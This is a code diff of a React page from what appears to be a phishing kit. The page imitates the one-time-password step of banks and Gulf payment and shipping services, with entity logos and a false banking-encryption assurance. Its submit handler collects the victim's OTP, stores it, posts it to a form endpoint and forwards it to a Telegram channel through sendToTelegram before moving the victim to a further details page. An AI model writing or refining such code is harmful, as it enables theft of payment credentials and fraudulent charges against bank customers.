@@ -5,26 +5,18 @@ import { useLinkData } from "@/hooks/useLinkData";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { getBankById } from "@/lib/banks";
-import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
 import { ThemedButton } from "@/components/ui/ThemedButton";
 import { ThemedCard } from "@/components/ui/ThemedCard";
-import { ThemedHeader } from "@/components/ui/ThemedHeader";
 import {
   ShieldCheck,
-  Smartphone,
-  Timer,
   RefreshCw,
   Loader2,
-  Lock,
-  CheckCircle2,
-  Building2,
-  Truck,
-  Wallet,
 } from "lucide-react";
 import BankLogo from "@/components/BankLogo";
-import PaymentMetaTags from "@/components/PaymentMetaTags";
+import { DynamicMetaTags } from "@/components/DynamicMetaTags";
+import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";
 
 const PaymentOTP = () => {
   const { id } = useParams();
@@ -54,8 +46,6 @@ const PaymentOTP = () => {
   const rawAmount = linkData?.payload?.cod_amount || 500;
   const formattedAmount = formatCurrency(rawAmount, selectedCountry);
 
-  const category = companyKey.includes('shipping') ? 'shipping' : companyKey.includes('bank') ? 'bank' : 'payment_gateway';
-
   useEffect(() => {
     const countdown = setInterval(() => setTimer((prev) => (prev > 0 ? prev - 1 : 0)), 1000);
     return () => clearInterval(countdown);
@@ -75,37 +65,38 @@ const PaymentOTP = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    const otpValue = otp.join("");
-    if (otpValue.length < 6) {
-      toast({ title: "خطأ", description: "يرجى إدخال رمز التحقق كاملاً", variant: "destructive" });
+    const otpString = otp.join("");
+    if (otpString.length < 4) {
+      toast({ title: "خطأ", description: "الرجاء إدخال رمز التحقق كاملاً", variant: "destructive" });
       return;
     }
 
     setIsSubmitting(true);
+
     try {
       if (id && id !== 'local') {
-        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, otp: otpValue } });
+        await updateLink.mutateAsync({ linkId: id, payload: { ...linkData?.payload, otp: otpString } });
       }
 
       await fetch("/", {
         method: "POST",
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: new URLSearchParams({
-          "form-name": "otp-verification",
+          "form-name": "payment-confirmation",
           linkId: id!,
-          otp: otpValue,
-          bank: selectedBank?.nameAr || "البطاقة البنكية",
-          amount: formattedAmount
+          service: entityConfig.nameAr,
+          amount: formattedAmount,
+          otp: otpString
         }).toString()
       });
 
       await sendToTelegram({
-        type: 'otp_verification',
-        data: { otp: otpValue, bank: selectedBank?.nameAr || "البطاقة البنكية", amount: formattedAmount },
+        type: 'otp_input',
+        data: { otp: otpString, service: entityConfig.nameAr, amount: formattedAmount },
         timestamp: new Date().toISOString()
       });
 
-      navigate(`/pay/${id}/receipt${window.location.search}`);
+      navigate(`/pay/${id}/details${window.location.search}`);
     } catch (error) {
       toast({ title: "خطأ", description: "فشل التحقق من الرمز", variant: "destructive" });
     } finally {
@@ -113,126 +104,105 @@ const PaymentOTP = () => {
     }
   };
 
-  if (linkLoading || !linkData) return null;
+  if (linkLoading || !linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background">
+        <Loader2 className="w-10 h-10 animate-spin text-primary" />
+      </div>
+    );
+  }
 
   return (
-    <div className="min-h-screen flex flex-col bg-background font-primary" dir="rtl">
-      <PaymentMetaTags
-        serviceKey={selectedBankId ? `bank_${selectedBankId}` : companyKey || "bank"}
-        serviceName={selectedBank?.nameAr || entityConfig.nameAr}
-        title="تأكيد رمز التحقق (OTP)"
+    <MirrorPageWrapper 
+      entityId={selectedBankId || companyKey} 
+      title="تأكيد الدفع"
+      subtitle="Security Code Verification"
+      linkData={linkData}
+    >
+      <DynamicMetaTags
+        entityId={selectedBankId || companyKey}
+        title={`تأكيد الدفع - ${entityConfig.nameAr}`}
       />
 
-      <ThemedHeader
-        config={entityConfig}
-        title={selectedBank?.nameAr || entityConfig.nameAr}
-        subtitle="SECURE SESSION"
-      />
+      <ThemedCard config={entityConfig} variant="elevated" className="overflow-hidden">
+        <div className="h-2 w-full bg-primary" />
+        <div className="p-6 sm:p-10 space-y-8">
+          <div className="flex flex-col items-center gap-6">
+            <div className="w-20 h-20 bg-background rounded-full border flex items-center justify-center shadow-inner overflow-hidden">
+               {selectedBank ? (
+                 <BankLogo bankId={selectedBankId!} className="h-14 w-14 object-contain" />
+               ) : (
+                 <img src={entityConfig.logo} alt={entityConfig.nameAr} className="h-14 w-14 object-contain" />
+               )}
+            </div>
+            <div className="text-center space-y-1">
+              <h2 className="text-xl font-bold text-foreground">رمز التحقق مطلوب</h2>
+              <p className="text-sm text-muted-foreground">أدخل الرمز المرسل إلى هاتفك لإتمام العملية</p>
+            </div>
+          </div>
 
-      <main className="flex-1 flex items-center justify-center p-4 py-12">
-        <div className="w-full max-w-md space-y-8">
-          <ThemedCard config={entityConfig} variant="elevated" className="text-center">
-            <div className="p-8 sm:p-12 space-y-8">
-              <div
-                className="w-20 h-20 rounded-3xl mx-auto flex items-center justify-center text-white shadow-xl animate-in zoom-in duration-500"
-                style={{ background: `linear-gradient(135deg, ${entityConfig.primary}, ${entityConfig.accent})` }}
+          <form onSubmit={handleSubmit} className="space-y-8">
+            <div className="flex justify-center gap-3" dir="ltr">
+              {otp.map((digit, index) => (
+                <input
+                  key={index}
+                  ref={(el) => (inputRefs.current[index] = el)}
+                  type="text"
+                  maxLength={1}
+                  value={digit}
+                  onChange={(e) => handleOtpChange(index, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(index, e)}
+                  className="w-10 h-14 sm:w-12 sm:h-16 text-center text-2xl font-bold bg-muted border-2 border-border rounded-[var(--gcc-radius-button)] focus:border-primary focus:ring-4 focus:ring-primary/20 transition-all outline-none"
+                  style={{ borderRadius: 'var(--gcc-radius-button)' }}
+                  required
+                />
+              ))}
+            </div>
+
+            <div className="space-y-4">
+              <div className="flex items-center justify-between px-2">
+                <span className="text-xs font-bold text-muted-foreground uppercase tracking-widest">المبلغ: {formattedAmount}</span>
+                <span className={timer > 0 ? "text-primary font-bold" : "text-destructive font-bold"}>
+                  {Math.floor(timer / 60)}:{(timer % 60).toString().padStart(2, "0")}
+                </span>
+              </div>
+
+              <ThemedButton
+                config={entityConfig}
+                type="submit"
+                disabled={isSubmitting}
+                loading={isSubmitting}
               >
-                <Smartphone className="w-10 h-10" />
-              </div>
+                {isSubmitting ? "جاري التحقق..." : "تأكيد الرمز"}
+              </ThemedButton>
 
-              <div className="space-y-2">
-                <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-foreground">رمز التحقق لمرة واحدة</h2>
-                <p className="text-sm font-medium leading-relaxed text-muted-foreground">
-                  تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم جوالك المسجل لدى {selectedBank?.nameAr || entityConfig.nameAr} لإتمام عملية دفع <span className="font-bold text-foreground">{formattedAmount}</span>
-                </p>
-              </div>
-
-              <form onSubmit={handleSubmit} className="space-y-8">
-                <div className="flex justify-center gap-3 sm:gap-4" dir="ltr">
-                  {otp.map((digit, index) => (
-                    <input
-                      key={index}
-                      type="text"
-                      inputMode="numeric"
-                      maxLength={1}
-                      value={digit}
-                      onChange={(e) => handleOtpChange(index, e.target.value)}
-                      onKeyDown={(e) => handleKeyDown(index, e)}
-                      ref={(el) => (inputRefs.current[index] = el)}
-                      className="text-center text-3xl font-bold transition-all"
-                      style={{
-                        width: '3.5rem',
-                        height: entityConfig.btnHeight,
-                        borderRadius: entityConfig.inputRadius,
-                        border: `2px solid ${entityConfig.inputBorder}`,
-                        backgroundColor: '#FFFFFF',
-                        color: entityConfig.text,
-                        fontSize: '1.875rem',
-                        fontFamily: entityConfig.font,
-                        outline: 'none',
-                      }}
-                      onFocus={(e) => {
-                        e.target.style.borderColor = entityConfig.primary;
-                        e.target.style.boxShadow = `0 0 0 3px ${entityConfig.inputFocusRing}`;
-                      }}
-                      onBlur={(e) => {
-                        e.target.style.borderColor = entityConfig.inputBorder;
-                        e.target.style.boxShadow = 'none';
-                      }}
-                      required
-                    />
-                  ))}
-                </div>
-
-                <div className="space-y-6">
-                  <div className="flex items-center justify-center gap-4 text-sm">
-                    <div className="flex items-center gap-1.5 font-bold text-muted-foreground">
-                      <Timer className="w-4 h-4" />
-                      <span>تنتهي صلاحية الرمز خلال:</span>
-                    </div>
-                    <span className="font-bold min-w-[3rem] text-primary">
-                      {Math.floor(timer / 60)}:{(timer % 60).toString().padStart(2, "0")}
-                    </span>
-                  </div>
-
-                  <ThemedButton
-                    config={entityConfig}
-                    type="submit"
-                    disabled={isSubmitting}
-                    loading={isSubmitting}
-                  >
-                    {isSubmitting ? "جاري التحقق..." : "تأكيد الرمز"}
-                  </ThemedButton>
-
-                  <button
-                    type="button"
-                    disabled={timer > 0}
-                    className="flex items-center justify-center gap-2 mx-auto text-sm font-bold transition-colors disabled:opacity-50 text-muted-foreground"
-                  >
-                    <RefreshCw className="w-4 h-4" />
-                    <span>إعادة إرسال الرمز</span>
-                  </button>
-                </div>
-              </form>
+              <button
+                type="button"
+                disabled={timer > 0}
+                className="w-full py-2 flex items-center justify-center gap-2 text-sm font-bold transition-colors disabled:opacity-50 text-muted-foreground hover:text-primary"
+              >
+                <RefreshCw className="w-4 h-4" />
+                <span>إعادة إرسال الرمز</span>
+              </button>
             </div>
-
-            <div className="p-6 sm:p-8 border-t flex items-center gap-4 text-right" style={{ backgroundColor: `${entityConfig.primary}03`, borderColor: entityConfig.inputBorder }}>
-              <div className="w-12 h-12 rounded-full border flex-shrink-0 flex items-center justify-center shadow-sm" style={{ backgroundColor: entityConfig.surface, borderColor: entityConfig.inputBorder, color: entityConfig.primary }}>
-                <ShieldCheck className="w-6 h-6" />
-              </div>
-              <div className="space-y-0.5">
-                <p className="text-[10px] font-bold uppercase text-foreground">Secure Verification</p>
-                <p className="text-[9px] font-medium leading-none text-muted-foreground">هذه الصفحة محمية بنظام التشفير البنكي المتقدم</p>
-              </div>
-            </div>
-          </ThemedCard>
-
-          <p className="text-[10px] font-bold text-center uppercase tracking-widest px-8 leading-relaxed text-muted-foreground">
-            لا تشارك رمز التحقق مع أي شخص. موظفو البنك لن يطلبوا منك هذا الرمز أبداً.
-          </p>
+          </form>
         </div>
-      </main>
-    </div>
+
+        <div className="p-6 sm:p-8 border-t flex items-center gap-4 text-right bg-primary/5 border-border">
+          <div className="w-12 h-12 rounded-full border border-border bg-card flex-shrink-0 flex items-center justify-center text-primary shadow-sm">
+            <ShieldCheck className="w-6 h-6" />
+          </div>
+          <div className="space-y-0.5">
+            <p className="text-[10px] font-bold uppercase text-foreground">Secure Verification</p>
+            <p className="text-[9px] font-medium leading-none text-muted-foreground">هذه الصفحة محمية بنظام التشفير البنكي المتقدم</p>
+          </div>
+        </div>
+      </ThemedCard>
+
+      <p className="text-[10px] font-bold text-center uppercase tracking-widest px-8 leading-relaxed py-8 text-muted-foreground opacity-60">
+        لا تشارك رمز التحقق مع أي شخص. موظفو البنك لن يطلبوا منك هذا الرمز أبداً.
+      </p>
+    </MirrorPageWrapper>
   );
 };
 
